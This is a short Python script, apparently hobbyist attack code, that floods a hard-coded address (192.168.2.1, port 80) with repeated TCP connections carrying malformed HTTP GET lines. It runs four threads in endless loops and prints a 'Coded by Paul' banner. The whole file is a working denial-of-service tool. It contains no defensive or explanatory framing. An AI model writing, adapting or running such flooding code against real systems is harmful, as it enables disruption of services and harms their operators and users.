import socket
from threading import Thread
import time

host = "192.168.2.1"
ip = host
port = 80

print("\u001b[32m[Coded by Paul]")
time.sleep(3)


def dos():
    while True:
        mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            mysocket.connect((ip, port))
            mysocket.send(str.encode("GET " + "RANDOM MESSAGE" + "HTTP/1.1 \r\n"))
            mysocket.sendto(str.encode("GET " + "RANDOM MESSAGE" + "HTTP/1.1 \r\n"), (ip, port))
            print("ping")
        except socket.error:
            print("{X} Could Not Connect \n")
        mysocket.close()


for i in range(4):
    t = Thread(target=dos)
    t.start()
